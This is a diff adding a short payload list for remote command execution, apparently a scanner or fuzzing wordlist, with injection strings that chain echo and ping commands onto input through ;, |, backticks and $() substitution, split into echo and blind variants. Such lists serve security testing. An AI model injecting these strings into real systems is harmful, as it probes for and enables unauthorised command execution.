@@ -1,0 +1,13 @@
+# Remote Command Execution payload
+
+# echo
+;echo domain
+|echo domain
+`echo domain`
+$(echo domain)
+
+# blind
+;ping option 3 domain
+|ping option 3 domain
+`ping option 3 domain`
+$(ping option 3 domain)
